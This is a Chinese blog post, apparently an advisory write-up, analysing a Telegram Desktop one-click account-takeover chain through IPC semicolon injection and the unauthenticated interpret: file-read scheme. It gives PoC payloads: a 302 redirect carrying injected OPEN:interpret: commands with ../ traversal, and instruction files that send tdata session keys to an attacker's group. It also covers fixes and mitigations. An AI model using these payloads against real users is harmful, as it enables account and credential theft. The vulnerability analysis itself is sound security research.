@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Telegram Desktop 一键账号接管：IPC 注入 + interpret: 未授权路径读取的攻击链拆解 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../calendar.html" >日历</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>Telegram Desktop 一键账号接管：IPC 注入 + interpret: 未授权路径读取的攻击链拆解</h1>
+<time>2026-10-10</time>
+<ul>
+<li>漏洞分析</li>
+<li>Telegram</li>
+<li>IPC注入</li>
+<li>攻击链</li>
+<li>网络安全</li>
+</ul>
+<hr />
+<p>一条你随手点的群聊链接，可能就足以让别人成为你。CVE-2026-107181 就是这么一条链：Telegram Desktop 的单实例 IPC 里分隔符没有转义，被注入的命令又能调用内部 URI 方案 <code>interpret:</code> 读任意文件。两个缺陷叠起来，攻击者拿到的是本地 tdata 目录里的会话密钥，等同于账号本身。本文按源码路径拆开这条链。</p>
+<h2>背景：单实例 IPC 是怎么工作的</h2>
+<p>操作系统允许程序注册 URI scheme，这样遇到某种链接才知道该拉起谁。Telegram Desktop 注册的是 <code>tg://</code>。</p>
+<p>Telegram 没运行时点 <code>tg://...</code>，系统拉起进程，进程把字符串当参数、转成 URL 对象、内部处理——一个进程，没有通信。</p>
+<p>但 Telegram 已经在跑时呢？系统既不认识也不检查，照样拉起新进程。Telegram 得自己判断"我是多余的那个"，靠的是尝试连接一个本地 socket：已在运行的实例是 server，启动后一直监听；新进程是 client，连上了就说明已有实例活着，于是把链接交出去然后退出。</p>
+<p>socket 只传字节，不传对象，内存里的 URL 对象过不了这条通道，必须扁平化成一行文本。这就是序列化，反过来是反序列化。凡是结构化数据要跨边界，这两步避不开——也正是数据内部的边界从"结构"退化成"文本里的字符"的那个精确时刻。</p>
+<h2>缺陷一：未转义的分隔符</h2>
+<p>Telegram 用了一套自己的简单格式：每条指令是一个关键字 + 参数 + 一个分号收尾。比如要打开一个链接：</p>
+<div class="highlight"><pre><span></span><code><span class="n">OPEN</span><span class="o">:</span><span class="n">tg</span><span class="o">://</span><span class="n">x</span><span class="o">?</span><span class="n">a</span><span class="o">=</span><span class="mi">1</span><span class="o">;</span>
+</code></pre></div>
+
+<p>构造这行的地方在 <code>sandbox.cpp:295-297</code>：</p>
+<div class="highlight"><pre><span></span><code><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="k">auto</span><span class="w"> </span><span class="o">&amp;</span><span class="n">url</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">cRefStartUrls</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">commands</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="sa">u</span><span class="s">&quot;OPEN:&quot;</span><span class="n">_q</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">url</span><span class="p">.</span><span class="n">toString</span><span class="p">(</span><span class="n">QUrl</span><span class="o">::</span><span class="n">FullyEncoded</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="sc">&#39;;&#39;</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>接收端做反序列化，在 <code>sandbox.cpp:453-463</code>：读收到的字节，<strong>在每个分号处切开</strong>，把每一片当成一条独立指令。凡是 <code>OPEN:</code> 开头的就吃掉：</p>
+<div class="highlight"><pre><span></span><code><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">int32</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cmds</span><span class="p">.</span><span class="n">indexOf</span><span class="p">(</span><span class="n">QChar</span><span class="p">(</span><span class="sc">&#39;;&#39;</span><span class="p">),</span><span class="w"> </span><span class="n">from</span><span class="p">);</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">from</span><span class="p">;</span><span class="w"> </span><span class="p">...)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">auto</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">base</span><span class="o">::</span><span class="n">StringViewMid</span><span class="p">(</span><span class="n">cmds</span><span class="p">,</span><span class="w"> </span><span class="n">from</span><span class="p">,</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">from</span><span class="p">);</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cmd</span><span class="p">.</span><span class="n">startsWith</span><span class="p">(</span><span class="sa">u</span><span class="s">&quot;OPEN:&quot;</span><span class="n">_q</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">startUrls</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">cmds</span><span class="p">.</span><span class="n">mid</span><span class="p">(</span><span class="n">from</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">5</span><span class="p">).</span><span class="n">mid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">8192</span><span class="p">));</span>
+</code></pre></div>
+
+<p>那么，如果一个被传输的值里自带分号——也就是格式用来做分隔的那个字符——会怎样？给链接加一点东西：</p>
+<div class="highlight"><pre><span></span><code><span class="nt">tg</span><span class="o">://</span><span class="nt">x</span><span class="o">?</span><span class="nt">a</span><span class="o">=</span><span class="nt">1</span><span class="o">;</span><span class="nt">CMD</span><span class="p">:</span><span class="nd">quit</span>
+</code></pre></div>
+
+<p>新进程把它当成<strong>一个</strong> URL，因为对它来说那个分号只是 query 里的普通字符。它扁平化后写进 socket：</p>
+<div class="highlight"><pre><span></span><code><span class="n">OPEN</span><span class="o">:</span><span class="n">tg</span><span class="o">://</span><span class="n">x</span><span class="o">?</span><span class="n">a</span><span class="o">=</span><span class="mi">1</span><span class="o">;</span><span class="n">CMD</span><span class="o">:</span><span class="n">quit</span><span class="o">;</span>
+</code></pre></div>
+
+<p>运行中的实例在<strong>每个分号处</strong>切，得到两条指令而不是一条：</p>
+<div class="highlight"><pre><span></span><code><span class="n">OPEN</span><span class="o">:</span><span class="n">tg</span><span class="o">://</span><span class="n">x</span><span class="o">?</span><span class="n">a</span><span class="o">=</span><span class="mi">1</span>
+<span class="n">CMD</span><span class="o">:</span><span class="n">quit</span>
+</code></pre></div>
+
+<p>这就是注入，也是第一个缺陷。上面的例子里注入的是 <code>CMD:</code>。总共只接受四条命令，其中三条无害，第四条是 <code>OPEN:</code>。</p>
+<h2>缺陷二：<code>interpret:</code> 方案没有鉴权</h2>
+<p>翻代码能翻出 Telegram 内部另一个 URI 方案，叫 <code>interpret:</code>。操作系统压根不知道 <code>interpret:</code> 开头的链接该怎么办，这是应用自己处理的（<code>application.cpp:1162-1164</code>）：</p>
+<div class="highlight"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="n">scheme</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sa">u</span><span class="s">&quot;interpret&quot;</span><span class="n">_q</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">interprets</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="n">path</span><span class="p">());</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>它本来是 Telegram 发布自己版本时用的工具。新版本要发到频道里，changelog 当标题——手工做太麻烦，于是脚本写一个小文本文件，里面写明频道、要发的文件、要写的文字，然后带着这个文件路径启动 Telegram：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Telegram/build/updates.py:206</span>
+<span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="o">...</span> <span class="s1">&#39;Telegram -sendpath interpret://&#39;</span> <span class="o">+</span> <span class="n">scriptPath</span> <span class="o">+</span> <span class="s1">&#39;/.../command.txt&#39;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</code></pre></div>
+
+<p>指令文件长这样：</p>
+<div class="highlight"><pre><span></span><code><span class="n">from</span><span class="o">:</span><span class="w"> </span><span class="mi">1234567890</span>
+<span class="n">channel</span><span class="o">:</span><span class="w"> </span><span class="mi">1987654321</span>
+<span class="n">file</span><span class="o">:</span><span class="w"> </span><span class="n">out</span><span class="sr">/Release/deploy/6.9.3/</span><span class="n">tsetup</span><span class="o">.</span><span class="mf">6.9</span><span class="o">.</span><span class="mi">3</span><span class="o">.</span><span class="na">exe</span>
+<span class="n">caption</span><span class="o">:</span><span class="w"> </span><span class="n">TDesktop</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mf">12.06</span><span class="o">.</span><span class="mi">26</span><span class="o">:</span>
+<span class="o">-</span><span class="w"> </span><span class="n">Fixed</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">crash</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">media</span><span class="w"> </span><span class="n">viewer</span><span class="o">.</span>
+<span class="o">-</span><span class="w"> </span><span class="n">Added</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">sticker</span><span class="w"> </span><span class="n">pack</span><span class="o">.</span>
+</code></pre></div>
+
+<p><code>from:</code> 是发送者，<code>channel:</code> 是目标频道，<code>file:</code> 是要发的文件。处理这个文件的函数叫 <code>InterpretSendPath</code>（<code>support_helper.cpp:673-680</code>）：</p>
+<div class="highlight"><pre><span></span><code><span class="n">QString</span><span class="w"> </span><span class="nf">InterpretSendPath</span><span class="p">(</span><span class="n">not_null</span><span class="o">&lt;</span><span class="n">Window</span><span class="o">::</span><span class="n">SessionController</span><span class="o">*&gt;</span><span class="w"> </span><span class="n">window</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="n">QString</span><span class="w"> </span><span class="o">&amp;</span><span class="n">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">QFile</span><span class="w"> </span><span class="n">f</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">f</span><span class="p">.</span><span class="n">open</span><span class="p">(</span><span class="n">QIODevice</span><span class="o">::</span><span class="n">ReadOnly</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;App Error: Could not open interpret file: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">path</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="k">auto</span><span class="w"> </span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">QString</span><span class="o">::</span><span class="n">fromUtf8</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">readAll</span><span class="p">());</span>
+<span class="w">    </span><span class="p">...</span>
+</code></pre></div>
+
+<p><strong>这个函数没有任何鉴权检查</strong>。当它从命令行进来（发布脚本就是这么调的）时不是问题——攻击者得有机器上的立足点，有了立足点他自己就能读文件。但一旦同样的动作能通过 socket、进而通过注入触达，一个危险功能就变成了"受害者点一下链接"就能用。</p>
+<p>这是缺失的授权，也是第二个缺陷。</p>
+<h2>把指令文件放到磁盘上</h2>
+<p>能放指令文件、并且控制 <code>file:</code> 和 <code>channel:</code> 的攻击者，能读受害者的任意文件并发到自己选的频道或超级群。那么怎么把文本文件塞到别人磁盘上可预测的路径？</p>
+<p>最直接的办法是当群聊附件发。实际上，Telegram Desktop 默认配置下，<strong>群里收到的文件 8 MiB 以内会自动下载</strong>（广播频道默认关闭自动下载）。文件落到标准文件夹、用发送者选的名字、<strong>不需要受害者点任何东西</strong>，位置可预测（重名会存成 <code>instructions1 (2).txt</code> 之类）。</p>
+<p>Telegram 自己构造这个路径（<code>file_utilities.cpp:172-181</code>）：</p>
+<div class="highlight"><pre><span></span><code><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="o">&lt;</span><span class="n">user</span><span class="o">&gt;</span>\<span class="n">Downloads</span>\<span class="n">Telegram</span><span class="w"> </span><span class="n">Desktop</span>\<span class="o">&lt;</span><span class="n">file</span><span class="w"> </span><span class="n">name</span><span class="o">&gt;</span>
+</code></pre></div>
+
+<p>把文件发进群，攻击者就知道它会被存到哪。路径里似乎还剩一个未知量——Windows 用户名——但 <code>interpret:</code> 用了 <code>..</code> 相对路径（<code>logs.cpp:381</code> 的 <code>%APPDATA%\Telegram Desktop</code>）就绕过去了：</p>
+<div class="highlight"><pre><span></span><code><span class="n">interpret</span><span class="p">:</span><span class="o">../../../</span><span class="n">Downloads</span><span class="o">/</span><span class="n">Telegram</span><span class="o">%</span><span class="mi">20</span><span class="n">Desktop</span><span class="o">/</span><span class="n">instructions</span><span class="o">.</span><span class="n">txt</span>
+</code></pre></div>
+
+<p>于是拿到确定性路径，<strong>根本不需要知道用户名</strong>。</p>
+<h2>从任意文件读取到账号接管</h2>
+<p><code>InterpretSendPath</code> 给的原语始终是"任意文件读取"。变的只是你读什么：SSH 私钥、浏览器密码库、云凭证文件，或者带 API token 的配置文件。</p>
+<p>但 Telegram 本地数据不是明文存的，用户磁盘上的东西全都加密，包括会话授权。会话授权就是客户端向 Telegram 服务器标识自己的密钥，<strong>拿住它就等于拿住这个账号</strong>，性质相当于网站的 session cookie。</p>
+<p>Telegram 用了密钥包装。涉及两把密钥：第一把是 DEK（数据加密密钥），长、随机、高熵，用来加密用户数据；第二把是 KEK（密钥加密密钥），只加密 DEK，而且它不是密码本身——它由密码经密钥派生函数（KDF）配合一个存在旁边的 salt 派生出来。</p>
+<p>伪代码里，打开本地数据的那条链是这样：</p>
+<div class="highlight"><pre><span></span><code>salt, encrypted_DEK = read(&quot;tdata/key_datas&quot;)
+passcode = user_passcode()        # empty if none is set
+KEK = KDF(passcode, salt)
+DEK = decrypt(encrypted_DEK, KEK)
+session = decrypt(authorization_file, DEK)
+</code></pre></div>
+
+<p><strong>默认情况下 Telegram Desktop 没有本地密码</strong>——你得自己去设置里设。没设时，喂给派生的密码是空串（<code>storage_domain.cpp:102</code>）。所以没设密码的人，谁拿到 <code>tdata/key_datas</code> 谁就能一路解到会话。</p>
+<p>涉及三个文件，其中只有两个含密钥：</p>
+<div class="highlight"><pre><span></span><code>tdata/
+├── key_datas                    salt 和加密后的 DEK
+├── D877F783D5D3EF8Cs            MTProto 授权，用 DEK 加密
+└── D877F783D5D3EF8C/
+    └── maps                     账号存储数据的索引
+</code></pre></div>
+
+<p>那个文件夹名不是随机的、也不是每次安装都不同，它由字符串 <code>data</code> 派生（<code>storage_file_utilities.cpp:241-250</code>）。第三个文件是索引，不含密钥，但少了它会话也加载不出来——Telegram 只在读索引的时候才去读授权。不过偷它是个选择：攻击者完全可以自己造一个。PoC 里为了省事就顺手一起拿了。</p>
+<p>结论：<strong>三件套齐了，攻击者就拥有账号</strong>——把它们丢进一个干净的 <code>tdata</code> 就能登上。</p>
+<h2>投递链接</h2>
+<p>攻击需要受害者点一下，而且必须来自 Telegram 外部。<code>tg://</code> 可以从 <code>https</code> 重定向触发（<code>click_handler_types.cpp:278</code>、<code>ui_integration.cpp:437</code>）。攻击者准备一个 HTTP 302，把命令塞进 Location：</p>
+<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/rules</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">corvus.sec</span>
+
+HTTP/1.1 302 Found
+Location: tg://x?a=1;OPEN:interpret:instructions.txt
+</code></pre></div>
+
+<p>视浏览器和受害者是否用过该 handler 而定，系统可能会先弹确认框。</p>
+<h2>完整 PoC</h2>
+<ol>
+<li>攻击者建一个超级群，把受害者拉进来。Telegram 默认隐私设置允许这么做，被拉的人不会收到确认。</li>
+<li>攻击者在群里发三个指令文本文件，每个对应一个要偷的文件，目标都指向攻击者自己的群。省略 <code>from:</code> 时发送者默认就是发文件的人：</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="n">channel</span><span class="o">:</span><span class="w"> </span><span class="mi">2001234567</span>
+<span class="n">file</span><span class="o">:</span><span class="w"> </span><span class="n">tdata</span><span class="o">/</span><span class="n">key_datas</span>
+<span class="n">caption</span><span class="o">:</span><span class="w"> </span><span class="n">poc</span>
+</code></pre></div>
+
+<p>文件必须纯文本、LF 换行、无 BOM。另外两个分别指向 <code>tdata/D877F783D5D3EF8Cs</code> 和 <code>tdata/D877F783D5D3EF8C/maps</code>。</p>
+<ol>
+<li>攻击者往聊天里发一条看起来无害的链接 <code>https://corvus.sec/rules</code>。</li>
+<li>受害者点它，浏览器跟随重定向，每条目标带一个命令，作为单行发送：</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="n">tg</span><span class="p">:</span><span class="o">//</span><span class="n">x</span><span class="err">?</span><span class="n">a</span><span class="o">=</span><span class="mi">1</span>
+<span class="p">;</span><span class="n">OPEN</span><span class="p">:</span><span class="n">interpret</span><span class="p">:</span><span class="o">../../../</span><span class="n">Downloads</span><span class="o">/</span><span class="n">Telegram</span><span class="o">%</span><span class="mi">20</span><span class="n">Desktop</span><span class="o">/</span><span class="n">instructions1</span><span class="o">.</span><span class="n">txt</span>
+<span class="p">;</span><span class="n">OPEN</span><span class="p">:</span><span class="n">interpret</span><span class="p">:</span><span class="o">../../../</span><span class="n">Downloads</span><span class="o">/</span><span class="n">Telegram</span><span class="o">%</span><span class="mi">20</span><span class="n">Desktop</span><span class="o">/</span><span class="n">instructions2</span><span class="o">.</span><span class="n">txt</span>
+<span class="p">;</span><span class="n">OPEN</span><span class="p">:</span><span class="n">interpret</span><span class="p">:</span><span class="o">../../../</span><span class="n">Downloads</span><span class="o">/</span><span class="n">Telegram</span><span class="o">%</span><span class="mi">20</span><span class="n">Desktop</span><span class="o">/</span><span class="n">instructions3</span><span class="o">.</span><span class="n">txt</span>
+</code></pre></div>
+
+<ol>
+<li>系统拉起第二个 Telegram 进程，把 URL 通过 socket 转发给正在运行的实例，未转义的分号把它切开，注入触发。</li>
+<li>三个 <code>interpret:</code> 动作把三个文件发进攻击者的群。</li>
+<li>攻击者用这三件套重建 <code>tdata</code>，登上受害者的账号。</li>
+</ol>
+<h2>修复与缓解</h2>
+<p><strong>升级到 7.2.9 或更高版本</strong>——这是唯一真正堵住问题的办法，其余都是降低暴露面。</p>
+<p>修复本身除了转义，还加了两条：同一条连接一旦携带 <code>OPEN:</code>，就跳过 <code>CMD:</code> 和 <code>CTRL:</code> 记录；一旦非本地 URL 出现在连接上，就丢弃本地文件路径。</p>
+<p>时间线值得一提：</p>
+<table>
+<thead>
+<tr>
+<th>日期</th>
+<th>事件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2026-06-25</td>
+<td>通过 ZDI 上报</td>
+</tr>
+<tr>
+<td>2026-09-16</td>
+<td>厂商独立修复，commit <code>db3405699f</code></td>
+</tr>
+<tr>
+<td>2026-09-17</td>
+<td>Telegram Desktop 7.2.9 发布</td>
+</tr>
+<tr>
+<td>2026-09-30</td>
+<td>ZDI 以"已修复"结案，披露权归还研究者</td>
+</tr>
+<tr>
+<td>2026-10-03</td>
+<td>本文披露</td>
+</tr>
+<tr>
+<td>2026-10-07</td>
+<td>分配 CVE-2026-107181</td>
+</tr>
+</tbody>
+</table>
+<p><strong>修复是悄悄发的</strong>：7.2.9 的 changelog 只提了一个渲染修复，关掉这条链的 commit 标题是"Remove legacy interpret path helper"，没有任何公告。</p>
+<p>短期缓解措施：</p>
+<ul>
+<li><strong>打开"每次询问保存位置"</strong>。这样自动下载根本不发生，指令文件到不了磁盘——这是除升级外最有效的一条。</li>
+<li><strong>把"谁可以拉我进群"限制为仅联系人</strong>。被偷的文件只能发到频道或超级群，这一条拿掉了攻击者的投递场所。</li>
+<li><strong>设置本地密码，并且当成真密码来选</strong>。它不阻止文件被偷，只是让偷到的会话没法直接用。</li>
+</ul>
+<h2>一点开发者的视角</h2>
+<p>这条链最值得记住的不是 Telegram 的具体 bug，而是两个反复出现的模式。</p>
+<p>第一，<strong>序列化边界就是信任边界</strong>。任何"把结构化数据压成字符串再切开"的自制协议，只要分隔符没转义，就一定存在注入。这和 HTTP header 注入、SMTP 命令注入、日志注入是同一类错误，只是换了个载体。自己设计 IPC 格式时，参数要么长度前缀、要么严格转义，别指望"反正参数里不会出现分隔符"。</p>
+<p>第二，<strong>"只有本地命令行能调用"不是鉴权</strong>。<code>InterpretSendPath</code> 的开发者大概觉得它只被发布脚本用，所以没做权限检查——但一旦有任何路径能间接触达它，这个"内部工具"就变成了攻击面。凡是能读文件、能发网络请求、能执行命令的函数，无论当前调用者是谁，都该假设它未来会被暴露在不可信输入之下，显式做授权。</p>
+<p>对普通用户来说结论很简单：升级到 7.2.9+，打开"每次询问保存位置"，把入群权限收紧到联系人。这三条花不了一分钟。</p>
+<h2>⚠️ 网络安全免责声明</h2>
+<p>本文内容仅供技术研究与安全学习之用。文中描述的漏洞分析、攻击链拆解和代码示例均基于公开披露的安全研究，旨在帮助开发者理解攻击原理、提升安全意识和防御能力。</p>
+<p>请勿将本文所述技术用于任何未经授权的安全测试、渗透攻击或非法用途。任何因滥用本文信息而造成的法律后果，由使用者自行承担，与本文作者无关。</p>
+<p>如发现系统安全漏洞，请通过合法渠道向相关厂商或平台报告，共同维护网络安全生态。</p>
+<hr />
+<p>参考来源：<a href="https://beaksec.github.io/posts/telegram-desktop-one-click-account-takeover/">Telegram Desktop: one-click account takeover via IPC injection — beaksec</a>（CVE-2026-107181，修复于 7.2.9，commit <code>db3405699f</code>）</p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
